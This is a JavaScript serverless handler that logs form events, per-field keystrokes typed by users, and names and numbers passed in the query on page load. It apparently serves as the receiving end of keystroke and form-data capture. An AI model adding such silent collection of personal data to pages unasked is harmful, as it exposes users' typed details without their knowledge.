// api/log.js
export default function handler(req, res) {
  /* ------------------------------------------------------------
     1.  Handle POST requests
         • form_submission_started  – full payload in req.body.data
         • keystroke                – per‑field updates while typing
     ------------------------------------------------------------ */
  if (req.method === 'POST') {
    const {
      event       = 'unknown_post_event',
      timestamp   = new Date().toISOString(),
      userAgent   = 'unknown UA',
      data        = null,
      field       = null,
      value       = null
    } = req.body || {};

    console.log('⮕  POST:', event);
    console.log('   Timestamp :', timestamp);
    console.log('   UserAgent :', userAgent);
    if (data)  console.log('   Data      :', JSON.stringify(data));
    if (field) console.log('   Field     :', field, '=>', value);

    return res.status(200).json({ success: true });
  }

  /* ------------------------------------------------------------
     2.  Handle GET requests
         • landing_query – fired immediately on page load
     ------------------------------------------------------------ */
  if (req.method === 'GET') {
    const {
      event     = 'unknown_get_event',
      first     = '',
      last      = '',
      number    = '',
      timestamp = new Date().toISOString()
    } = req.query;

    console.log('⮕  GET:', event);
    console.log('   Timestamp :', timestamp);
    console.log('   First     :', first);
    console.log('   Last      :', last);
    console.log('   Number    :', number);

    return res.status(200).json({ success: true });
  }

  /* ------------------------------------------------------------
     3.  Reject everything else
     ------------------------------------------------------------ */
  res.setHeader('Allow', ['POST', 'GET']);
  res.status(405).end(`Method ${req.method} Not Allowed`);
}

